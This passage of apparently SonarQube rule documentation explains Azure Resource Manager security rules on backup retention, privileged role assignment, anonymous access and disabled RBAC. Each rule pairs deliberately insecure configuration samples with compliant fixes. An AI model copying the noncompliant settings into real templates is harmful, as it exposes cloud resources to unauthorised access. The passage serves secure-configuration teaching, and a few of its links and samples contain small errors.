                &#34;sourceAddressPrefix&#34;: &#34;10.0.0.0/24&#34;,
                &#34;access&#34;: &#34;Allow&#34;,
                &#34;direction&#34;: &#34;Inbound&#34;
            }
        }
    ]
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
resource securityRules &#39;Microsoft.Network/networkSecurityGroups/securityRules&#64;2022-11-01&#39; &#61; {
  name: &#39;securityRules&#39;
  properties: {
    direction: &#39;Inbound&#39;
    access: &#39;Allow&#39;
    protocol: &#39;*&#39;
    destinationPortRange: &#39;22&#39;
    sourceAddressPrefix: &#39;10.0.0.0/24&#39;
  }
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html" rel="nofollow">AWS Documentation</a> - Security groups for your VPC </li><li> <a href="https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview" rel="nofollow">Azure Documentation</a> - Network security
  groups </li><li> <a href="https://cloud.google.com/vpc/docs/using-firewalls" rel="nofollow">GCP Documentation</a> - Firewalls </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6364">
              azureresourcemanager:S6364
            </a>
          </td>
          <td>
            <details>
              <p>Reducing the backup retention duration can reduce an organization’s ability to re-establish service in case of a security incident.</p>
<p>Data backups allow to overcome corruption or unavailability of data by recovering as efficiently as possible from a security incident.</p>
<p>Backup retention duration, coverage, and backup locations are essential criteria regarding functional continuity.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This component is essential for the information system infrastructure. </li><li> This component is essential for mission-critical functions. </li><li> Compliance policies require this component to be backed up for a specific amount of time. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Increase the backup retention period to an amount of time sufficient enough to be able to restore service in case of an incident.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites/config-backup?pivots&#61;deployment-language-arm-template" rel="nofollow">Azure App
Service</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
      &#34;apiVersion&#34;: &#34;2022-03-01&#34;,
      &#34;name&#34;: &#34;webApp&#34;,
    },
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites/config&#34;,
      &#34;apiVersion&#34;: &#34;2022-03-01&#34;,
      &#34;name&#34;: &#34;webApp/backup&#34;,
      &#34;properties&#34;: {
        &#34;backupSchedule&#34;: {
          &#34;frequencyInterval&#34;: 1,
          &#34;frequencyUnit&#34;: &#34;Day&#34;,
          &#34;keepAtLeastOneBackup&#34;: true,
          &#34;retentionPeriodInDays&#34;: 2
        }
      },
      &#34;dependsOn&#34;: [
        &#34;[resourceId(&#39;Microsoft.Web/sites&#39;, &#39;webApp&#39;)]&#34;
      ]
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.documentdb/databaseaccounts?pivots&#61;deployment-language-arm-template" rel="nofollow">Azure
Cosmos DB</a> accounts:</p>
<pre data-diff-id="4" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DocumentDB/databaseAccounts&#34;,
      &#34;apiVersion&#34;: &#34;2023-04-15&#34;,
      &#34;properties&#34;: {
        &#34;backupPolicy&#34;: {
          &#34;type&#34;: &#34;Periodic&#34;,
          &#34;periodicModeProperties&#34;: {
            &#34;backupIntervalInMinutes&#34;: 1440,
            &#34;backupRetentionIntervalInHours&#34;: 8
          }
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.recoveryservices/vaults/backuppolicies?pivots&#61;deployment-language-arm-template" rel="nofollow">Azure
Backup</a> vault policies:</p>
<pre data-diff-id="6" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.RecoveryServices/vaults&#34;,
      &#34;apiVersion&#34;: &#34;2023-01-01&#34;,
      &#34;name&#34;: &#34;testVault&#34;,
      &#34;resources&#34;: [
        {
          &#34;type&#34;: &#34;backupPolicies&#34;,
          &#34;apiVersion&#34;: &#34;2023-01-01&#34;,
          &#34;name&#34;: &#34;testVault/backupPolicy&#34;,
          &#34;properties&#34;: {
            &#34;backupManagementType&#34;: &#34;AzureSql&#34;,
            &#34;retentionPolicy&#34;: {
              &#34;retentionPolicyType&#34;: &#34;SimpleRetentionPolicy&#34;,
              &#34;retentionDuration&#34;: {
                &#34;count&#34;: 2,
                &#34;durationType&#34;: &#34;Days&#34;
              }
            }
          }
        }
      ]
    }
  ]
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites/config-backup?pivots&#61;deployment-language-arm-template" rel="nofollow">Azure App
Service</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
      &#34;apiVersion&#34;: &#34;2022-03-01&#34;,
      &#34;name&#34;: &#34;webApp&#34;,
    },
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites/config&#34;,
      &#34;apiVersion&#34;: &#34;2022-03-01&#34;,
      &#34;name&#34;: &#34;webApp/backup&#34;,
      &#34;properties&#34;: {
        &#34;backupSchedule&#34;: {
          &#34;frequencyInterval&#34;: 1,
          &#34;frequencyUnit&#34;: &#34;Day&#34;,
          &#34;keepAtLeastOneBackup&#34;: true,
          &#34;retentionPeriodInDays&#34;: 15
        }
      },
      &#34;dependsOn&#34;: [
        &#34;[resourceId(&#39;Microsoft.Web/sites&#39;, &#39;webApp&#39;)]&#34;
      ]
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.documentdb/databaseaccounts?pivots&#61;deployment-language-arm-template" rel="nofollow">Azure
Cosmos DB</a> accounts:</p>
<pre data-diff-id="4" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DocumentDB/databaseAccounts&#34;,
      &#34;apiVersion&#34;: &#34;2023-04-15&#34;,
      &#34;properties&#34;: {
        &#34;backupPolicy&#34;: {
          &#34;type&#34;: &#34;Periodic&#34;,
          &#34;periodicModeProperties&#34;: {
            &#34;backupIntervalInMinutes&#34;: 1440,
            &#34;backupRetentionIntervalInHours&#34;: 360
          }
        }
      }
    }
  ]
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.recoveryservices/vaults/backuppolicies?pivots&#61;deployment-language-arm-template" rel="nofollow">Azure
Backup</a> vault policies:</p>
<pre data-diff-id="6" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.RecoveryServices/vaults&#34;,
      &#34;apiVersion&#34;: &#34;2023-01-01&#34;,
      &#34;name&#34;: &#34;testVault&#34;,
      &#34;resources&#34;: [
        {
          &#34;type&#34;: &#34;backupPolicies&#34;,
          &#34;apiVersion&#34;: &#34;2023-01-01&#34;,
          &#34;name&#34;: &#34;testVault/backupPolicy&#34;,
          &#34;properties&#34;: {
            &#34;backupManagementType&#34;: &#34;AzureSql&#34;,
            &#34;retentionPolicy&#34;: {
              &#34;retentionPolicyType&#34;: &#34;SimpleRetentionPolicy&#34;,
              &#34;retentionDuration&#34;: {
                &#34;count&#34;: 8,
                &#34;durationType&#34;: &#34;Days&#34;
              }
            }
          }
        }
      ]
    }
  ]
}
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6381">
              azureresourcemanager:S6381
            </a>
          </td>
          <td>
            <details>
              <p>Azure Resource Manager offers built-in roles that can be assigned to users, groups, or service principals. Some of these roles should be carefully
assigned as they grant sensitive permissions like the ability to reset passwords for all users.</p>
<p>An Azure account that fails to limit the use of such roles has a higher risk of being breached by a compromised owner.</p>
<p>This rule raises an issue when one of the following roles is assigned:</p>
<ul><li> Contributor (b24988ac-6180-42a0-ab88-20f7382dd24c) </li><li> Owner (8e3af657-a8ff-443c-a75c-2fe8c4bcb635) </li><li> User Access Administrator (18d7d88d-d35e-4fb5-a5c3-7773c20a72d9) </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The user, group, or service principal doesn’t use the entirety of this extensive set of permissions to operate on a day-to-day basis. </li><li> It is possible to follow the Separation of Duties principle and split permissions between multiple users, but it’s not enforced. There is a
  risk if you answered yes to any of these questions. </li></ul>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Limit the assignment of Owner roles to less than 3 people or service principals. </li><li> Apply the least privilege principle by choosing a role with a limited set of permissions. </li><li> If no built-in role meets your needs, create a custom role with as few permissions as possible. </li></ul>
<h2>Sensitive Code Example</h2>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Authorization/roleAssignments&#34;,
      &#34;apiVersion&#34;: &#34;2022-04-01&#34;,
      &#34;properties&#34;: {
        &#34;description&#34;: &#34;Assign the contributor role&#34;,
        &#34;principalId&#34;: &#34;string&#34;,
        &#34;principalType&#34;: &#34;ServicePrincipal&#34;,
        &#34;roleDefinitionId&#34;: &#34;[resourceId(&#39;Microsoft.Authorization/roleDefinitions&#39;, &#39;b24988ac-6180-42a0-ab88-20f7382dd24c&#39;)]&#34;
      }
    }
  ]
}
</pre>
<pre data-diff-id="11" data-diff-type="noncompliant">
resource symbolicname &#39;Microsoft.Authorization/roleAssignments&#64;2022-04-01&#39; &#61; {
  scope: tenant()
  properties: {
    description: &#39;Assign the contributor role&#39;
    principalId: &#39;string&#39;
    principalType: &#39;ServicePrincipal&#39;
    roleDefinitionId: resourceId(&#39;Microsoft.Authorization/roleAssignments&#39;, &#39;b24988ac-6180-42a0-ab88-20f7382dd24c&#39;)
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre data-diff-id="1" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Authorization/roleAssignments&#34;,
      &#34;apiVersion&#34;: &#34;2022-04-01&#34;,
      &#34;properties&#34;: {
        &#34;description&#34;: &#34;Assign the reader role&#34;,
        &#34;principalId&#34;: &#34;string&#34;,
        &#34;principalType&#34;: &#34;ServicePrincipal&#34;,
        &#34;roleDefinitionId&#34;: &#34;[resourceId(&#39;Microsoft.Authorization/roleDefinitions&#39;, &#39;acdd72a7-3385-48ef-bd42-f606fba81ae7&#39;)]&#34;
      }
    }
  ]
}
</pre>
<pre data-diff-id="11" data-diff-type="compliant">
resource symbolicname &#39;Microsoft.Authorization/roleAssignments&#64;2022-04-01&#39; &#61; {
  scope: tenant()
  properties: {
    description: &#39;Assign the reader role&#39;
    principalId: &#39;string&#39;
    principalType: &#39;ServicePrincipal&#39;
    roleDefinitionId: resourceId(&#39;Microsoft.Authorization/roleAssignments&#39;, &#39;acdd72a7-3385-48ef-bd42-f606fba81ae7&#39;)
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access
  Control </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles" rel="nofollow">Azure Documentation</a> - Azure built-in roles </li><li> <a href="https://docs.microsoft.com/en-us/azure/role-based-access-control/best-practices" rel="nofollow">Azure Documentation</a> - Best practices for Azure
  RBAC </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6380">
              azureresourcemanager:S6380
            </a>
          </td>
          <td>
            <details>
              <p>Allowing anonymous access can reduce an organization’s ability to protect itself against attacks on its Azure resources.</p>
<p>Security incidents may include disrupting critical functions, data theft, and additional Azure subscription costs due to resource overload.</p>
<p>Using authentication coupled with fine-grained authorizations helps bring defense-in-depth and bring traceability to investigators of security
incidents.</p>
<p>Depending on the affected Azure resource, multiple authentication choices are possible: Active Directory Authentication, OpenID implementations
(Google, Microsoft, etc.) or native Azure mechanisms.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This Azure resource is essential for the information system infrastructure. </li><li> This Azure resource is essential for mission-critical functions. </li><li> This Azure resource stores or processes sensitive data. </li><li> Compliance policies require access to this resource to be authenticated. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable authentication in this Azure resource, and disable anonymous access.</p>
<p>If only Basic Authentication is available, enable it.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/" rel="nofollow">App Service</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
            &#34;apiVersion&#34;: &#34;2022-03-01&#34;,
            &#34;name&#34;: &#34;example&#34;
        }
    ]
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/api-management/" rel="nofollow">API Management</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.ApiManagement/service&#34;,
            &#34;apiVersion&#34;: &#34;2022-09-01-preview&#34;,
            &#34;name&#34;: &#34;example&#34;
        }
    ]
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/data-factory/" rel="nofollow">Data Factory</a> Linked Services:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.DataFactory/factories/linkedservices&#34;,
            &#34;apiVersion&#34;: &#34;2018-06-01&#34;,
            &#34;name&#34;: &#34;example&#34;,
            &#34;properties&#34;: {
                &#34;type&#34;: &#34;Web&#34;,
                &#34;typeProperties&#34;: {
                    &#34;authenticationType&#34;: &#34;Anonymous&#34;
                }
            }
        }
    ]
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/product-categories/storage/" rel="nofollow">Storage Accounts and Storage Containers</a>:</p>
<pre data-diff-id="4" data-diff-type="noncompliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.Storage/storageAccounts&#34;,
            &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
            &#34;name&#34;: &#34;example&#34;,
            &#34;properties&#34;: {
                &#34;allowBlobPublicAccess&#34;: true
            }
        }
    ]
}
</pre>
<pre data-diff-id="5" data-diff-type="noncompliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.Storage/storageAccounts&#34;,
            &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
            &#34;name&#34;: &#34;example&#34;,
            &#34;resources&#34;: [
                {
                    &#34;type&#34;: &#34;blobServices/containers&#34;,
                    &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
                    &#34;name&#34;: &#34;blobContainerExample&#34;,
                    &#34;properties&#34;: {
                        &#34;publicAccess&#34;: &#34;Blob&#34;
                    }
                }
            ]
        }
    ]
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/cache/" rel="nofollow">Redis Caches</a>:</p>
<pre data-diff-id="6" data-diff-type="noncompliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.Cache/redis&#34;,
            &#34;apiVersion&#34;: &#34;2022-06-01&#34;,
            &#34;name&#34;: &#34;example&#34;,
            &#34;properties&#34;: {
                &#34;redisConfiguration&#34;: {
                    &#34;authnotrequired&#34;: &#34;true&#34;
                }
            }
        }
    ]
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://azure.microsoft.com/en-us/services/app-service/" rel="nofollow">App Services and equivalent</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
            &#34;apiVersion&#34;: &#34;2022-03-01&#34;,
            &#34;name&#34;: &#34;example&#34;,
            &#34;resources&#34;: [
                {
                    &#34;type&#34;: &#34;config&#34;,
                    &#34;apiVersion&#34;: &#34;2022-03-01&#34;,
                    &#34;name&#34;: &#34;authsettingsV2&#34;,
                    &#34;properties&#34;: {
                        &#34;globalValidation&#34;: {
                            &#34;requireAuthentication&#34;: true,
                            &#34;unauthenticatedClientAction&#34;: &#34;RedirectToLoginPage&#34;
                        }
                    }
                }
            ]
        }
    ]
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/api-management/" rel="nofollow">API Management</a>:</p>
<pre data-diff-id="2" data-diff-type="compliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.ApiManagement/service&#34;,
            &#34;apiVersion&#34;: &#34;2022-09-01-preview&#34;,
            &#34;name&#34;: &#34;example&#34;,
            &#34;resources&#34;: [
                {
                    &#34;type&#34;: &#34;portalsettings&#34;,
                    &#34;apiVersion&#34;: &#34;2022-09-01-preview&#34;,
                    &#34;name&#34;: &#34;signin&#34;,
                    &#34;properties&#34;: {
                        &#34;enabled&#34;: true
                    }
                },
                {
                    &#34;type&#34;: &#34;apis&#34;,
                    &#34;apiVersion&#34;: &#34;2022-09-01-preview&#34;,
                    &#34;name&#34;: &#34;exampleApi&#34;,
                    &#34;properties&#34;: {
                        &#34;authenticationSettings&#34;: {
                            &#34;openid&#34;: {
                                &#34;bearerTokenSendingMethods&#34;: [&#34;authorizationHeader&#34;],
                                &#34;openidProviderId&#34;: &#34;&lt;an OpenID provider ID&gt;&#34;
                            }
                        }
                    }
                }
            ]
        }
    ]
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/data-factory/" rel="nofollow">Data Factory</a> Linked Services:</p>
<pre data-diff-id="3" data-diff-type="compliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.DataFactory/factories/linkedservices&#34;,
            &#34;apiVersion&#34;: &#34;2018-06-01&#34;,
            &#34;name&#34;: &#34;example&#34;,
            &#34;properties&#34;: {
                &#34;type&#34;: &#34;Web&#34;,
                &#34;typeProperties&#34;: {
                    &#34;authenticationType&#34;: &#34;Basic&#34;
                }
            }
        }
    ]
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/product-categories/storage/" rel="nofollow">Storage Accounts</a>:</p>
<pre data-diff-id="4" data-diff-type="compliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.Storage/storageAccounts&#34;,
            &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
            &#34;name&#34;: &#34;example&#34;,
            &#34;properties&#34;: {
                &#34;allowBlobPublicAccess&#34;: false
            }
        }
    ]
}
</pre>
<pre data-diff-id="5" data-diff-type="compliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.Storage/storageAccounts&#34;,
            &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
            &#34;name&#34;: &#34;example&#34;,
            &#34;resources&#34;: [
                {
                    &#34;type&#34;: &#34;blobServices/containers&#34;,
                    &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
                    &#34;name&#34;: &#34;blobContainerExample&#34;,
                    &#34;properties&#34;: {
                        &#34;publicAccess&#34;: &#34;None&#34;
                    }
                }
            ]
        }
    ]
}
</pre>
<p>For <a href="https://azure.microsoft.com/en-us/services/cache/" rel="nofollow">Redis Caches</a>:</p>
<pre data-diff-id="6" data-diff-type="compliant">
{
    &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
    &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
    &#34;resources&#34;: [
        {
            &#34;type&#34;: &#34;Microsoft.Cache/redis&#34;,
            &#34;apiVersion&#34;: &#34;2022-06-01&#34;,
            &#34;name&#34;: &#34;example&#34;,
            &#34;properties&#34;: {
                &#34;redisConfiguration&#34;: {}
            }
        }
    ]
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Boken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6383">
              azureresourcemanager:S6383
            </a>
          </td>
          <td>
            <details>
              <p>Disabling Role-Based Access Control (RBAC) on Azure resources can reduce an organization’s ability to protect itself against access controls being
compromised.</p>
<p>To be considered safe, access controls must follow the principle of least privilege and correctly segregate duties amongst users. RBAC helps
enforce these practices by adapting the organization’s access control needs into explicit role-based policies: It helps keeping access controls
maintainable and sustainable.</p>
<p>Furthermore, RBAC allows operations teams to work faster during a security incident. It helps to mitigate account theft or intrusions by quickly
shutting down accesses.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This Azure resource is essential for the information system infrastructure. </li><li> This Azure resource is essential for mission-critical functions. </li><li> Compliance policies require access to this resource to be enforced through the use of Role-Based Access Control. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Enable Azure RBAC when the Azure resource supports it. </li><li> For Kubernetes clusters, enable Azure RBAC if Azure AD integration is supported. Otherwise, use the built-in Kubernetes RBAC. </li></ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.containerservice/2023-03-01/managedclusters?pivots&#61;deployment-language-arm-template" rel="nofollow">AKS
Azure Kubernetes Service</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.ContainerService/managedClusters&#34;,
      &#34;apiVersion&#34;: &#34;2023-03-01&#34;,
      &#34;properties&#34;: {
        &#34;aadProfile&#34;: {
          &#34;enableAzureRBAC&#34;: false
        },
        &#34;enableRBAC&#34;: false
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource aks &#39;Microsoft.ContainerService/managedClusters&#64;2023-03-01&#39; &#61; {
  properties: {
    aadProfile: {
      enableAzureRBAC: false    // Sensitive
    }
    enableRBAC: false           // Sensitive
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.keyvault/2022-07-01/vaults?pivots&#61;deployment-language-arm-template" rel="nofollow">Key
Vault</a>:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.KeyVault/vaults&#34;,
      &#34;apiVersion&#34;: &#34;2022-07-01&#34;,
      &#34;properties&#34;: {
        &#34;enableRbacAuthorization&#34;: false
      }
    }
  ]
}
</pre>
<pre data-diff-id="4" data-diff-type="noncompliant">
resource keyVault &#39;Microsoft.KeyVault/vaults&#64;2022-07-01&#39; &#61; {
  properties: {
    enableRbacAuthorization: false    // Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.containerservice/2023-03-01/managedclusters?pivots&#61;deployment-language-arm-template" rel="nofollow">AKS
Azure Kubernetes Service</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.ContainerService/managedClusters&#34;,
      &#34;apiVersion&#34;: &#34;2023-03-01&#34;,
      &#34;properties&#34;: {
        &#34;aadProfile&#34;: {
          &#34;enableAzureRBAC&#34;: true
        },
        &#34;enableRBAC&#34;: true
      }
    }
  ]
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
resource aks &#39;Microsoft.ContainerService/managedClusters&#64;2023-03-01&#39; &#61; {
  properties: {
    aadProfile: {
      enableAzureRBAC: true     // Compliant
    }
    enableRBAC: true            // Compliant
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.keyvault/2022-07-01/vaults?pivots&#61;deployment-language-arm-template" rel="nofollow">Key
Vault</a>:</p>
<pre data-diff-id="3" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.KeyVault/vaults&#34;,
      &#34;apiVersion&#34;: &#34;2022-07-01&#34;,
      &#34;properties&#34;: {
        &#34;enableRbacAuthorization&#34;: true
      }
    }
  ]
}
</pre>
